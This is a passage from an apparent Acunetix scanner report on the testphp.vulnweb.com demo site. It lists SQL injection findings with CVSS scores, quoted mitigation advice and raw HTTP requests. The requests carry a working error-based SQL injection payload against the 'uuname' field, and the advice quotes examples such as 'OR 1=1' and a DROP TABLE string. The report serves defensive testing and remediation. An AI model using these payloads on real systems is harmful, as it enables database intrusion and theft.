       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /AJAX/infotitle.php HTTP/1.1
Content-Length: 6
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

id=1'&quot;]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:19 GMT
Content-Type: text/xml
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 145
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="62" color="red">
       <Name><![CDATA[SQL injection (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">uuname</font></b> was set to <b><font color="dark">'and(select 1 from(select count(*),concat((select concat(CHAR(52),CHAR(67),CHAR(117),CHAR(65),CHAR(65),CHAR(84),CHAR(78),CHAR(74),CHAR(121),CHAR(97),CHAR(72)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and'</font></b><br/>Injected pattern found: <pre wrap="virtual"><font color="blue">4CuAATNJyaH</font></pre>]]></Details>
       <Affects><![CDATA[/secured/newuser.php]]></Affects>
       <Parameter><![CDATA[uuname]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /secured/newuser.php HTTP/1.1
Content-Length: 503
Content-Type: application/x-www-form-urlencoded
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

signup=signup&amp;uaddress=3137%20Laguna%20Street&amp;ucc=4111111111111111&amp;uemail=sample%40email.tst&amp;upass=g00dPa%24%24w0rD&amp;upass2=g00dPa%24%24w0rD&amp;uphone=555-666-0606&amp;urname=vhwjlebf&amp;uuname='and(select%201%20from(select%20count(*)%2cconcat((select%20concat(CHAR(52)%2cCHAR(67)%2cCHAR(117)%2cCHAR(65)%2cCHAR(65)%2cCHAR(84)%2cCHAR(78)%2cCHAR(74)%2cCHAR(121)%2cCHAR(97)%2cCHAR(72))%20from%20information_schema.tables%20limit%200%2c1)%2cfloor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)and']]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:25 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 471
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="63" color="orange">
       <Name><![CDATA[Application error message]]></Name>
       <ModuleName><![CDATA[Scripting (Error_Message.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">cat</font></b> was set to <b><font color="dark"></font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">You have an error in your SQL syntax</font></pre>]]></Details>
       <Affects><![CDATA[/listproducts.php]]></Affects>
       <Parameter><![CDATA[cat]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[The error messages may disclose sensitive information. This information can be used to launch further attacks.]]></Impact>
       <Description><![CDATA[This page contains an error/warning message that may disclose sensitive information. The message can also contain the location of the file that produced the unhandled exception.<br/><br/>
This may be a false positive if the error message is found in documentation pages.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Review the source code for this script.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /listproducts.php?cat= HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
